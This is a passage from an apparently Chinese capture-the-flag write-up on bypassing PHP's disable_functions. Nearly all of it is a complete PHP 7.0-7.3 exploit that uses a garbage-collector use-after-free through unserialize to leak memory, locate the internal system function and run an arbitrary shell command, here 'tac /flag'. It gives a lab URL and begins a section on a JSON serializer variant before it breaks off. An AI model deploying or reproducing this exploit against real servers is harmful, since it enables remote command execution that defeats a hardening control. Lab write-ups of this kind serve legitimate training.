class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);<span class="comment">#这个写命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;chtg = <span class="variable language_">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">    <span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = <span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>访问以下URL即可出现flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-e2dba0faaf3a8abc.sandbox.ctfhub.com:10800/exploit.php</span><br></pre></td></tr></table></figure>
<h2 id="17-6-Json-Serializer-UAF"><a href="#17-6-Json-Serializer-UAF" class="headerlink" title="17.6  Json Serializer UAF"></a>17.6  Json Serializer UAF</h2><p>方法一：蚁剑插件PHP7_Serializer_UAF</p>
<p>方法二：脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span 